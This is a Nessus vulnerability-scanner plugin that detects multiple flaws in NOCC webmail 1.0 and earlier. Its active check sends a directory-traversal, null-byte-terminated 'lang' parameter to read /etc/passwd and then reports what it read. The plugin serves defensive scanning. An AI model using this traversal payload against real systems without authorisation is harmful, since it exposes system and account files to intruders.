#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20974);
  script_version("$Revision: 1.18 $");

  script_cve_id(
    "CVE-2006-0891", 
    "CVE-2006-0892", 
    "CVE-2006-0893", 
    "CVE-2006-0894", 
    "CVE-2006-0895"
  );
  script_bugtraq_id(16793);
  script_osvdb_id(
    23416,
    23417,
    23418,
    23419,
    23420,
    23421,
    23422,
    23423,
    23424,
    23425,
    23426,
    23427
  );

  script_name(english:"NOCC <= 1.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for a local file include flaw in NOCC");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running NOCC, an open source webmail application
written in PHP. 

The installed version of NOCC is affected by a local file include flaw
because it fails to sanitize user input to the 'lang' parameter of the
'index.php' script before using it to include other PHP files. 
Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker can leverage this issue to view
arbitrary files on the remote host and possibly to execute arbitrary
PHP code in files on the affected host. 

In addition, NOCC reportedly is affected by several other local and
remote file include, cross-site scripting, and information disclosure
vulnerabilities." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/noccw_10_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/425889/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/23");
 script_cvs_date("$Date: 2015/09/24 21:17:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:nocc:nocc");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/nocc", "/NOCC", "/webmail", "/mail", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If the initial page looks like NOCC...
  if ("nocc_webmail_login" >< res) {
    # Try to exploit one of the local file include flaw to read a file.
    file = "../../../../../../../../../../etc/passwd";
    w = http_send_recv3(method:"GET", 
      item:string(
        dir, "/index.php?",
        "lang=", file, "%00"
      ), 
      exit_on_fail: 1,
      port:port
    );
    res = w[2];

    # There's a problem if it looks like the passwd file.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      contents = res - strstr(res, '<!DOCTYPE html PUBLIC');
      if (contents) contents = contents - strstr(contents, "<br>");
      if (contents) {
        report = string(
          "\n",
          "Here are the contents of '/etc/passwd' that Nessus was able to\n",
          "read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
